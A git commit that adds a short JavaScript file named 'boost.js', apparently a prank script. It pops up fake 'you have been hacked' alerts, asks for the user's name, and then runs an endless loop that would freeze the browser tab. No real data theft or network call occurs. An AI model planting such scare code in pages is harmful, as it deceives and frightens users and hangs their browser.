082e611e152a1eadef588c7fda020a5ccc7defd8
Amukh1 <85003861+amukh1@users.noreply.github.com>
2021-11-23 14:33:33 -0500

    Create boost.js

---
+++ boost.js
@@ -0,0 +1,11 @@
+alert('reading data...')
+alert('sending payload...')
+alert('you have been hacked.')
+var xd = prompt('what is your name.', 'name')
+alert(`${xd}... your screwed`)
+alert('crashing chrome...')
+
+for (var i = 0; i < Infinity; i++) {
+console.log(`crashing chrome ${i}%`)
+
+}
